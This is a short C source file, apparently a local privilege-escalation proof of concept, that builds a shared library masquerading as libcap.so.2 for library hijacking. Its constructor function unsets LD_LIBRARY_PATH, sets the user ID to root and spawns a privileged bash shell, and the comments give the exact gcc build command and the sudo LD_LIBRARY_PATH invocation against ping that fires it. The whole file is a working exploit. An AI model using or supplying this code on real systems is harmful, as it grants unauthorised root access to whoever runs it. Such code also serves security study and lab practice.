#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

/*
 * In this example we target ping, which uses ./libcap.so.2
 * To hijack it, we compile with
 * $ gcc -fPIC -shared -nostartfiles -o ./libcap.so.2 ./libcap.c
 * and then execute with
 * $ sudo LD_LIBRARY_PATH=. ping localhost   
 * */

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

